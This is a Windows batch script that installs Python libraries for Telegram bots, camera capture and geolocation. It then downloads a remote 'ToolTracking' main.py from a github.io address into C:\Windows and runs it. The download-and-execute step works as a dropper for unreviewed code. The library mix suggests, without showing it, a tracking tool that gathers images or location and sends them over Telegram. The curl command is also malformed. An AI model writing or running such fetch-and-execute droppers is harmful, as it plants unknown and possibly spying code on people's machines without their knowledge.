@echo off
echo Installing Python packages...

pip install telegram
pip install numpy
pip install opencv-python
pip install telebot
pip install python-telegram-bot
pip install Pillow
pip install geocoder
pip install geopy
pip install pytz

echo Installation complete.

echo Start download tool
curl -L -O https://ngocphat03.github.io/Tools/ToolTracking/main.py -o C:\Windows
echo Finish dowload tool

echo Run tool...
python C:\Windows\main.py
echo Finish 

